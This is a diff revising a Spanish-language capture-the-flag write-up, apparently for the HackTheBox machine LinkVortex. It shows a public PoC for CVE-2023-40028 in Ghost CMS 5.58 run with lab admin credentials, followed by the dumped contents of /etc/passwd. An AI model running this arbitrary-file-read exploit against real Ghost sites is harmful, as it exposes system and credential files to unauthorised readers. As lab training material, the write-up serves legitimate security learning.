@@ -460,9 +460,9 @@ De acuerdo con la versión del CMS **Ghost 5.58**, esta se encuentra afectada po
 Siguiendo la PoC de [CVE-2023-40028](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028) pude obtener el **/etc/passwd**
 
 ```bash
+./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
 WELCOME TO THE CVE-2023-40028 SHELL
-Enter the file path to read (or type 'exit' to quit): /etc/passwd       
-File content:
+file> /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -483,10 +483,7 @@ gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologi
 nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
 node:x:1000:1000::/home/node:/bin/bash
-Enter the file path to read (or type 'exit' to quit): 
 ```
-
-
 
 Dentro del proyecto encontré un archivo interesante: **Dockerfile.ghost**. Básicamente, este archivo define cómo construir una imagen de contenedor para el CMS **Ghost**.
 
